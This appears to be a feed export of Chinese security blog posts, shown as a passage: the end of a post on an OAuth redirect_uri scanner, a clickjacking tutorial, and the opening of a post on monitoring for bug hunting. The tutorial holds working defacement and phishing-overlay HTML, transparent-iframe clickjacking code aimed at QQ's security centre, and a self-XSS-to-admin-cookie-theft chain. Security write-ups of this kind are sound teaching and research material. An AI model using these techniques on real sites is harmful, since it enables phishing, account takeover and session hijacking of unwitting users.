	&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tempUrl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;domainB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;c&quot;&gt;# print url&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;redirect uri is illegal&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt;redirect_uri&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*] This Website is safe.&quot;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*] This Website is vulnerable!&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlparse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlparse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;resUrl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlparse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse_qs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;items&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()])[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'redirect_uri'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resUrl&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;raw_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;URL: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;scan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;poc的使用方法很简单，只需要复制QQ和微信快捷登陆的链接：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-02-12/0x06.jpg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;经过我们实验室的排查发现存在风险的厂商如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-02-12/0x07.jpg&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;等国内知名厂商近百家都存在此危害。&lt;/p&gt;

&lt;h1 id=&quot;修复建议&quot;&gt;&lt;strong&gt;修复建议&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;redirect_uri的值做限制&lt;/p&gt;

&lt;h1 id=&quot;结尾&quot;&gt;&lt;strong&gt;结尾&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;文章参考：&lt;/p&gt;

&lt;p&gt;http://wooyun.jozxing.cc/search?keywords=OAuth&amp;amp;content_search_by=by_bugs&lt;/p&gt;

&lt;p&gt;http://www.cnvd.org.cn/flaw/show/CNVD-2014-02785&lt;/p&gt;

&lt;p&gt;http://www.cnvd.org.cn/flaw/show/CNVD-2018-01622&lt;/p&gt;</content><author><name>Vulkey_Chen</name></author><summary type="html">什么是OAuth2.0？</summary></entry><entry><title type="html">鸡肋点搭配ClickJacking攻击-获取管理员权限</title><link href="http://localhost:4000/archives/2017-12-20/1" rel="alternate" type="text/html" title="鸡肋点搭配ClickJacking攻击-获取管理员权限" /><published>2017-12-20T00:00:00+08:00</published><updated>2017-12-20T00:00:00+08:00</updated><id>http://localhost:4000/archives/2017-12-20/clickjacking-and-selfxss</id><content type="html" xml:base="http://localhost:4000/archives/2017-12-20/1">&lt;h1 id=&quot;前言&quot;&gt;前言&lt;/h1&gt;

&lt;p&gt;有一段时间没做测试了，偶尔的时候也会去挖挖洞。本文章要写的东西是我利用&lt;code class=&quot;highlighter-rouge&quot;&gt;ClickJacking&lt;/code&gt;拿下管理员权限的测试过程。但在说明过程之前，先带大家了解一下&lt;code class=&quot;highlighter-rouge&quot;&gt;ClickJacking&lt;/code&gt;的&lt;strong&gt;基本原理以及简单的漏洞挖掘&lt;/strong&gt;。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h1 id=&quot;clickjacking&quot;&gt;ClickJacking&lt;/h1&gt;

&lt;p&gt;ClickJacking背景说明:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;ClickJacking（点击劫持）是由互联网安全专家罗伯特·汉森和耶利米·格劳斯曼在2008年首创的。
ClickJacking是一种视觉欺骗攻击手段，在web端就是iframe嵌套一个透明不可见的页面，让用户在不知情(被欺骗)的情况下，点击攻击者想要欺骗用户点击的位置。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;说道视觉欺骗，相信有&lt;code class=&quot;highlighter-rouge&quot;&gt;炫技&lt;/code&gt;经验的朋友们一定会想到，自己一个后台拿不下Webshell权限的时候，而想要黑掉首页从而达到炫技，使用的是什么呢？没错一般使用CSS样式表来劫持首页以造成黑掉的假象~&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;table&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;tbody&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;color:#FFFFFF;z-index: 6000;vertical-align:top;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt;hacked by key&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/tbody&amp;gt;&amp;lt;/table&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-12-20/0x00.png&quot; alt=&quot;CSS jacking&quot; /&gt;&lt;/p&gt;

&lt;p&gt;除了可以炫技，CSS劫持可以做的东西也有很多：例如经典的form表单钓鱼攻击&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;table&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;left:+0px;+top:+0px;+position:+fixed;z-index:+5000;position:absolute;width:100%;background-color:white;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://192.168.0.109/login.php&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;账号：&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;密码：&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pwd&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;登陆&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-12-20/0x01.png&quot; alt=&quot;CSS jacking&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这里就不对代码的意思进行解读了，可以看到CSS劫持达到的视觉欺骗攻击效果还是比较LOW的，因为这样的攻击手段偏被动式。而我要说的点击劫持其实也算是被动式，不过相对来说比较容易获得信任让被动式触发，这里只是单单对攻击手法谁的成功率比较高作为比较&lt;/p&gt;

&lt;p&gt;前面背景介绍的时候说了，点击劫持攻击其实就是镶嵌一个iframe框架(&lt;strong&gt;存在点击劫持漏洞的页面&lt;/strong&gt;)在页面上，然后再把其修改为透明的样式。这样的操作只是造成了视觉欺骗，还没达到欺骗点击的效果，所以就需要知道iframe框架其按钮的位置，然后在基于透明层模拟一个位置大小相同的按钮，发给用户让其点击~~&lt;/p&gt;

&lt;p&gt;这里以QQ安全中心的一个点击劫持为例，作为一个QQ的资深用户应该知道QQ是有安全中心紧急冻结QQ服务的，只要登录自己的安全中心就可以冻结，&lt;strong&gt;地址(漏洞地址，目前漏洞已经修复)&lt;/strong&gt;为：&lt;a href=&quot;https://aq.qq.com/cn2/message_center/wireless/wireless_seal_auth?source_id=2985&quot;&gt;https://aq.qq.com/cn2/message_center/wireless/wireless_seal_auth?source_id=2985&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-12-20/0x02.png&quot; alt=&quot;QQ Click Jacking&quot; /&gt;&lt;/p&gt;

&lt;p&gt;一点击，你的QQ就被会冻结(当时不知道逗了多少人~)，那这样怎么利用呢？&lt;/p&gt;

&lt;p&gt;1.建立iframe框架:&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;iframe&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;frame&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://aq.qq.com/cn2/message_center/wireless/wireless_seal_auth?source_id=2985&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;2.建立iframe的CSS样式:&lt;/p&gt;

&lt;div class=&quot;language-css highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;#frame&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;border&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;/*边框属性为0*/&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;100%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;/*框架高度100%*/&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;100%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;/*框架宽度100%*/&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;/*控制不透明度的属性，兼容各大浏览器*/&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;alpha&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Opacity&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;/*提供给IE浏览器8之前的*/&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;-moz-opacity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;/*提供给火狐浏览器的*/&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;-webkit-opacity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;/*提供给webkit内核的*/&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;-khtml-opacity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;/*提供给KHTML内核的*/&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;-ms-filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&quot;progid:DXImageTransform.Microsoft.Alpha(Opacity=0)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;/*提供给IE8之后的*/&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;opacity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;/*控制不透明度的属性，兼容各大浏览器*/&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;3.获取iframe框架引用的原页面的按钮位置和大小:&lt;/p&gt;

&lt;p&gt;大小直接通过审查元素可以看得到:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-12-20/0x03.png&quot; alt=&quot;QQ Click Jacking&quot; /&gt;&lt;/p&gt;

&lt;p&gt;现在要获取的就是按钮元素到浏览器顶部的距离，这里通过&lt;code class=&quot;highlighter-rouge&quot;&gt;id.offsetTop&lt;/code&gt;有些时候是无法直接获取的:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&amp;gt;&amp;gt;span_verify.offsetTop
←16&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;获取到的是16~很醉，所以使用如下的方法直接获取:&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'span_verify'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getBoundingClientRect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;top&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-12-20/0x04.png&quot; alt=&quot;QQ Click Jacking&quot; /&gt;
4.建立按钮:&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;button&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;button&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Click&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;5.根据第三步骤获取到的建立按钮样式:&lt;/p&gt;

&lt;div class=&quot;language-css highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;.button&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;position&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fixed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;100%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;42px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;margin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;auto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;left&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;278px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;6.散播，用户中招:
&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-12-20/0x05.png&quot; alt=&quot;QQ Click Jacking&quot; /&gt;
&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-12-20/0x06.png&quot; alt=&quot;QQ Click Jacking&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;一次点击劫持攻击案例&quot;&gt;一次点击劫持攻击案例&lt;/h2&gt;

&lt;p&gt;说了这么多，在前几天的测试中我是如何拿到管理员权限呢？挖掘到一处self-xss，这里先说明下self-xss可以理解为只能攻击myself~&lt;/p&gt;

&lt;p&gt;发现流程:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;发现输入框-&amp;gt;秉着见框就X的原理插入XSS Payload-&amp;gt;弹框-&amp;gt;发现成功&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;然而获取到的URL链接是&lt;code class=&quot;highlighter-rouge&quot;&gt;/?keyword=&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;，但是不是xss，keyword的值显示在输入框内，需要你再点击&lt;code class=&quot;highlighter-rouge&quot;&gt;搜索标题按钮&lt;/code&gt;才可以触发漏洞。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;形成的攻击思路-&amp;gt;iframe嵌套漏洞URL链接-&amp;gt;Click Jacking攻击页面构造-&amp;gt;通过留言给管理员引诱触发&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://vulkey.oss-cn-hangzhou.aliyuncs.com/2017-12-20/0x07.png&quot; alt=&quot;Click Jacking&quot; /&gt;&lt;/p&gt;

&lt;p&gt;攻击页面构造流程其实耐心读到这里的朋友已经是非常明确步骤了:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;建立iframe框架-&amp;gt;建立iframe框架CSS样式-&amp;gt;获取按钮位置大小-&amp;gt;建立按钮-&amp;gt;建立按钮CSS样式-&amp;gt;留言板留言外网攻击链接-&amp;gt;获取管理员Cookie-&amp;gt;Cookie伪造进入后台&lt;/strong&gt;&lt;/p&gt;

&lt;h1 id=&quot;结尾&quot;&gt;结尾&lt;/h1&gt;

&lt;p&gt;一次很有意思的实践，让自己满满的成就感，同时也完成了项目任务~&lt;/p&gt;</content><author><name>Vulkey_Chen</name></author><summary type="html">前言</summary></entry><entry><title type="html">浅析通过’监控’来辅助进行漏洞挖掘</title><link href="http://localhost:4000/archives/2017-10-28/1" rel="alternate" type="text/html" title="浅析通过'监控'来辅助进行漏洞挖掘" /><published>2017-10-28T00:00:00+08:00</published><updated>2017-10-28T00:00:00+08:00</updated><id>http://localhost:4000/archives/2017-10-28/web-monitor</id><content type="html" xml:base="http://localhost:4000/archives/2017-10-28/1">&lt;h1 id=&quot;前言&quot;&gt;前言&lt;/h1&gt;

&lt;p&gt;这篇文章总结了一些笔者个人在漏洞挖掘这一块的”姿势”，看了下好像也没相关类似TIPs或者文章出现，就写下此文。
&lt;!-- more --&gt;&lt;/p&gt;

&lt;p&gt;“监控”一词，相信大家很常见，例如：xxx酒店厕所被安装监控、xxx明星被狗仔24小时监控，也有奶权师傅写过的&lt;strong&gt;《Python系列之——利用Python实现微博监控》&lt;/strong&gt;和笔者写过的&lt;strong&gt;《从编写知乎粉丝监控到漏洞挖掘再到盗号》&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;但这跟”漏洞挖掘”联系起来的话似乎就让人摸不着头脑，其实不然，通过”监控”可以帮我们做很多事。&lt;/p&gt;

&lt;h1 id=&quot;监控狂人的修炼之路&quot;&gt;监控狂人的修炼之路&lt;/h1&gt;

